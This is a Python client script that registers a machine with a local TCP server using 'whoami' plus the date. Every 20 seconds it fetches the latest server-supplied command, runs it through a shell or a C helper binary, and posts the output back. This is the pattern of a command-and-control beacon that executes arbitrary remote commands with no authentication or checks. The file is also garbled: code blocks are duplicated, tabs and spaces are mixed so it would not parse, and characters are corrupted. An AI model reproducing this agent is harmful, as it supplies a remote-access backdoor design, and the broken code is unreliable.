#!/usr/bin/env python3
"""
reader_executor_client.py
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Procedural Python client that:
  1. Reads the LAST record in the DB for a given Machine ID
     (uses READ_LAST verb).
  2. Extracts the "command" field from the returned JSON record.
  3. Executes that command locally via the shell.
  4. Sends the command output back to the server as the "result"
     (uses UPDATE_RESULT verb).

Usage:
    python3 reader_executor_client.py <machine_id>

Example:
    python3 reader_executor_client.py MACHINE-42

Protocol (application layer, text over TCP):
    READ_LAST request  â†’ READ_LAST|<machine_id>\n
    READ_LAST response â†’ OK|<json_object>\n   or   ERR|NOT_FOUND\n

    UPDATE_RESULT req  â†’ UPDATE_RESULT|<uuid>|<result>\n
    UPDATE_RESULT resp â†’ OK|UPDATED\n           or   ERR|...\n

Note on the result field:
    Newlines and pipe characters in the command output are replaced
    with spaces so the single-line protocol stays intact.
    A production system would use length-prefixed or Base64 framing.
"""

import os
import socket
import sys
import json
import subprocess
from datetime import date
import uuid  # only used to show the concept â€“ server generates the real UUID
import time


# â”€â”€ configuration â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 9000
RECV_SIZE   = 4096
C_BINARY_RUN_SYSTEM_COMMAND  = "../C/run_system_command"

# â”€â”€ helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

import uuid  # only used to show the concept â€“ server generates the real UUID

# â”€â”€ configuration â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 9000
RECV_SIZE   = 4096

# â”€â”€ helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def send_request(host: str, port: int, message: str) -> str:
    """
    Open a TCP connection, send `message` (adds trailing newline if absent),
    read the single-line response, and return it stripped.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((host, port))
        payload = message if message.endswith("\n") else message + "\n"
        sock.sendall(payload.encode())

        response = b""
        while True:
            chunk = sock.recv(RECV_SIZE)
            if not chunk:
                break
            response += chunk
            if b"\n" in response:   # protocol: one line per response
                break

    return response.decode().strip()


def write_record(machine_id: str, command: str, result: str) -> None:
    """
    Send WRITE|machine_id|command to the server, print the result.
    """
    # Sanitise: the pipe character is our delimiter, so reject it in user input
    if "|" in machine_id or "|" in command:
        print("ERROR: machine_id and command must not contain '|'")
        sys.exit(1)

    request  = f"WRITE|{machine_id}|{command}|{result}"
    print(f"[writer] Connecting to {SERVER_HOST}:{SERVER_PORT} â€¦")
    response = send_request(SERVER_HOST, SERVER_PORT, request)
    print(f"[writer] Server response: {response}")

    if response.startswith("OK|"):
        assigned_uuid = response.split("|", 1)[1]
        print(f"[writer] Record written.  UUID = {assigned_uuid}")
    else:
        print(f"[writer] FAILED: {response}")
        sys.exit(1)


def send_and_receive(message: str) -> str:
    """
    Spawn the C process, send *message* via its stdin,
    and return the string it writes to its stdout.
    """
    # Start the C child process with connected pipes
    proc = subprocess.Popen(
        [C_BINARY_RUN_SYSTEM_COMMAND],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,   # let C's stderr reach our terminal
        text=True                 # work with str instead of bytes
    )
 
    # Write the message to the C program's stdin (add newline as delimiter)
    stdout_data, stderr_data = proc.communicate(input=message + "\n")
 
    # Forward any C-side diagnostics to our stderr
    if stderr_data:
        print(stderr_data, end="", file=sys.stderr)
 
    if proc.returncode != 0:
        raise RuntimeError(f"C process exited with code {proc.returncode}")
 
    # Strip the trailing newline that the C program appends
    return stdout_data.rstrip("\n")

def send_request(host: str, port: int, message: str) -> str:
    """
    Open a TCP connection, send `message` (adds \\n if absent),
    read the single-line response, and return it stripped.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((host, port))
        payload = message if message.endswith("\n") else message + "\n"
        sock.sendall(payload.encode())

        response = b""
        while True:
            chunk = sock.recv(RECV_SIZE)
            if not chunk:
                break
            response += chunk
            if b"\n" in response:
                break

    return response.decode().strip()


def read_last_record(machine_id: str) -> dict:
    """
    Ask the server for the last record that matches machine_id.
    Returns the parsed JSON dict, or exits on failure.
    """
    request  = f"READ_LAST|{machine_id}"
    print(f"[executor] READ_LAST  machine_id={machine_id}")
    response = send_request(SERVER_HOST, SERVER_PORT, request)
    print(f"[executor] Server response: {response}")

    if not response.startswith("OK|"):
        print(f"[executor] No record found or server error: {response}")
        sys.exit(1)

    json_str = response.split("|", 1)[1]

    try:
        record = json.loads(json_str)
    except json.JSONDecodeError as exc:
        print(f"[executor] Failed to parse JSON from server: {exc}")
        sys.exit(1)

    return record


def execute_command(command: str) -> str:
    """
    Run `command` in a subprocess shell and return its combined
    stdout + stderr output as a single sanitised string.
    Newlines and pipe characters are replaced so the protocol line stays clean.
    """
    print(f"[executor] Running command: {command!r}")
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        output = result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        output = "ERROR: command timed out after 30 seconds"
    except Exception as exc:
        output = f"ERROR: {exc}"

    # sanitise for our single-line pipe-delimited protocol
    sanitised = output.replace("\n", " ").replace("|", ";").strip()
    return sanitised if sanitised else "(no output)"


def update_result(record_uuid: str, result: str) -> None:
    """
    Send UPDATE_RESULT to write the command output back to the DB.
    """
    request  = f"UPDATE_RESULT|{record_uuid}|{result}"
    print(f"[executor] UPDATE_RESULT  uuid={record_uuid}")
    response = send_request(SERVER_HOST, SERVER_PORT, request)
    print(f"[executor] Server response: {response}")

    if response.startswith("OK|"):
        print("[executor] Result stored successfully.")
    else:
        print(f"[executor] Failed to update result: {response}")
        sys.exit(1)


# â”€â”€ entry point â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def main():
	'''
    if len(sys.argv) < 2:
        print("Usage: python3 reader_executor_client.py <machine_id>")
        print("Example: python3 reader_executor_client.py MACHINE-42")
        sys.exit(1)
	'''

    #machine_id = sys.argv[1]
	
	tmp_command = ""
	while True:
		
		if os.path.isfile("machine.txt"):
			print("The file machine.txt exists.")
			with open('machine.txt', 'r') as file:
				machine_id = file.read()
				print(machine_id)
				# Step 1 â€“ fetch the latest pending record for this machine
				record = read_last_record(machine_id)
				print(f"[executor] Record fetched: {record}")

				record_uuid = record.get("uuid", "")
				command     = record.get("command", "")

				if not record_uuid:
					print("[executor] Record has no UUID â€“ cannot update result.")
					sys.exit(1)

				if not command:
					print("[executor] Record has no command â€“ nothing to execute.")
					sys.exit(1)
				if tmp_command != command:
					# Step 2 â€“ run the command
					#output = execute_command(command)
					#if command.startswith("system:"):
					#	command_value = command.split(":")
					print(f"\n[Python] Sending System Command  : \"{command}\"")
								 
					output = send_and_receive(command)
								 
					print(f"[Python] Received  : \"{output}\"")
									
									
									
					print(f"[executor] System Command output: {output!r}")
					update_result(record_uuid, output)
				else:
					print("Unknown command")

					# Step 3 â€“ push the result back to the DB
					
				tmp_command = command
		else:
				
			with open("machine.txt", "w") as f:
				machine_id = execute_command("whoami") + date.today().isoformat()
				f.write(machine_id)
				write_record(machine_id, "whoami", execute_command("whoami"))
				tmp_command = "whoami"
				
		print("Wait for 20 seconds...")
		time.sleep(20)
		print("Finished!")




if __name__ == "__main__":
    main()
